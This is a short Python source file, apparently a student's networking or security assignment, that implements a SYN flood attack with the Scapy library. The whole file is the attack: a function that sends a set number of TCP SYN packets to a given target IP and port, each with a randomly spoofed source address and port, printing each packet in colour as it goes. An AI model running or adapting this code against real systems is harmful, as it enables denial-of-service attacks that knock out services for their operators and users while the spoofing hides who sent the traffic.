#############################################################################################
# @Author: José Manuel Batista Galanducho
# @Número de Aluno: 13651
# SYNFlood, this class executes the SYN Flood attack, sending multiple packages with random IPs
#############################################################################################
from scapy.all import send
from scapy.layers.inet import TCP, IP
from termcolor import colored
import random

####################################################################
# SYN flood Function
# @args: destination_ip, destination_port, pckt_quantity
#destination_ip -> target ip |  destination_port -> target port | pckt_quantity -> amount of packages to send
###################################################################
def SYN_Flood(destination_ip, destination_port, pckt_quantity = 20):

    for pckt in range(pckt_quantity):
        try:
            fake_ip = str(random.randint(1,223))+ "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(1,254))
            fake_port = random.randint(1024,65535)

            print(colored(f"Fake IP = {fake_ip} -> fake port = {fake_port}", "green"))
            print(colored(f"Destination IP = {destination_ip} -> destination port = {destination_port}", "green"))

            IP_packet = IP()
            IP_packet.src = fake_ip
            IP_packet.dst = destination_ip

            TCP_Packet = TCP()
            TCP_Packet.sport = fake_port
            TCP_Packet.dport = int(destination_port)
            TCP_Packet.flags = "S"

            send(IP_packet/TCP_Packet, verbose = 0)

        except Exception as e:
            print(colored(f"Error on SYN flood execution: {e}","red"))
    print(colored(f"","green"))